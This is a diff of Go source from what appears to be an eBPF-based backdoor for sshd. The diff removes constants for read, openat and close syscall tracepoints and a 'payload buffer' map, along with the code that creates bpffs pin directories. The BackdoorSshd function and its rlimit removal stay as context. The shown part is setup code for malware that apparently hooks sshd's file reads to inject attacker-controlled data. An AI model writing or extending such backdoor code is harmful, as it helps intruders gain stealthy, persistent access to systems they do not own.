@@ -17,25 +17,6 @@ const (
 )
 
 // Name of the kernel function to trace.
-const (
-	BPF_PROG_SYSCALL_ENTER_READ   = "sys_enter_read"
-	BPF_PROG_SYSCALL_EXIT_READ    = "sys_exit_read"
-	BPF_PROG_SYSCALL_ENTER_OPENAT = "sys_enter_openat"
-	BPF_PROG_SYSCALL_EXIT_OPENAT  = "sys_exit_openat"
-	BPF_PROG_SYSCALL_EXIT_CLOSE   = "sys_exit_close"
-)
-
-const (
-	BPF_MAPS_PAYLOAD_BUFFER = "map_payload_buffer"
-)
-
-const (
-	BPF_PROG_FS_SYSCALL_ENTER_READ   = bpfFSPath + "/" + BPF_PROG_SYSCALL_ENTER_READ
-	BPF_PROG_FS_SYSCALL_EXIT_READ    = bpfFSPath + "/" + BPF_PROG_SYSCALL_EXIT_READ
-	BPF_PROG_FS_SYSCALL_ENTER_OPENAT = bpfFSPath + "/" + BPF_PROG_SYSCALL_ENTER_OPENAT
-	BPF_PROG_FS_SYSCALL_EXIT_OPENAT  = bpfFSPath + "/" + BPF_PROG_SYSCALL_EXIT_OPENAT
-	BPF_PROG_FS_SYSCALL_EXIT_CLOSE   = bpfFSPath + "/" + BPF_PROG_SYSCALL_EXIT_CLOSE
-)
 
 func BackdoorSshd() (err error) {
 	stopper := make(chan os.Signal, 1)
@@ -43,28 +24,6 @@ func BackdoorSshd() (err error) {
 
 	// remove rlimit
 	if err := rlimit.RemoveMemlock(); err != nil {
-		return err
-	}
-
-	// make pin directories
-	if err := os.MkdirAll(BPF_PROG_FS_SYSCALL_ENTER_READ, os.ModePerm); err != nil {
-		log.Fatalf("failed to create bpf subpath: %+v", err)
-		return err
-	}
-	if err := os.MkdirAll(BPF_PROG_FS_SYSCALL_EXIT_READ, os.ModePerm); err != nil {
-		log.Fatalf("failed to create bpf subpath: %+v", err)
-		return err
-	}
-	if err := os.MkdirAll(BPF_PROG_FS_SYSCALL_ENTER_OPENAT, os.ModePerm); err != nil {
-		log.Fatalf("failed to create bpf subpath: %+v", err)
-		return err
-	}
-	if err := os.MkdirAll(BPF_PROG_FS_SYSCALL_EXIT_OPENAT, os.ModePerm); err != nil {
-		log.Fatalf("failed to create bpf subpath: %+v", err)
-		return err
-	}
-	if err := os.MkdirAll(BPF_PROG_FS_SYSCALL_EXIT_CLOSE, os.ModePerm); err != nil {
-		log.Fatalf("failed to create bpf subpath: %+v", err)
 		return err
 	}
 
